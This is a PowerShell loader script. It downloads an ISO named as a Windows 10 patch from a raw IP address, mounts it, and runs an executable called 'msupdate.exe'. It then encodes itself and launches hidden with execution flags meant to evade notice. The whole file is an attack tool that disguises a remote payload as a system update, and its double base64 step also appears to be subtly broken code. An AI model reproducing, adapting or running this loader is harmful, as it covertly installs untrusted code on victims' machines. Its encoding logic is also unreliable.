$Text = @'
try {
    # Download the ISO file
    $isoUrl = 'http://38.27.163.241:8884/Windows10_Patch.iso'
    $isoPath = 'C:\Temp\Windows10_Patch.iso'

    try {
        (New-Object System.Net.WebClient).DownloadFile($isoUrl, $isoPath)
        Write-Host "Download completed successfully."
    }
    catch {
        Write-Error "Failed to download the file from $isoUrl. Exception: $_"
        return
    }

    # Mount the ISO image
    $MountedImage = Mount-DiskImage -ImagePath $isoPath -PassThru
    
    # Verify that the image was mounted
    if ($MountedImage -eq $null) {
        Write-Error "Failed to mount the ISO image."
        return
    }

    # Get the drive letter of the mounted ISO
    $DriveLetter = ($MountedImage | Get-Volume).DriveLetter

    # Ensure the drive letter was obtained
    if (-not $DriveLetter) {
        Write-Error "Failed to obtain the drive letter for the mounted ISO."
        return
    }

    # Construct the path to the executable
    $ExePath = "${DriveLetter}:\msupdate.exe"

    # Output the constructed path for debugging
    Write-Host "Constructed path: $ExePath"

    # Check if the file exists
    if (Test-Path $ExePath) {
        # Execute the file directly
        Start-Process -FilePath $ExePath
    } else {
        Write-Error "Executable not found at path: $ExePath"
    }
}
catch {
    Write-Error "An error occurred: $_"
}
'@
$Bytes = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Text))
$EncodedText =[Convert]::ToBase64String($Bytes)
powershell.exe -w hidden -nop -enc $EncodedText
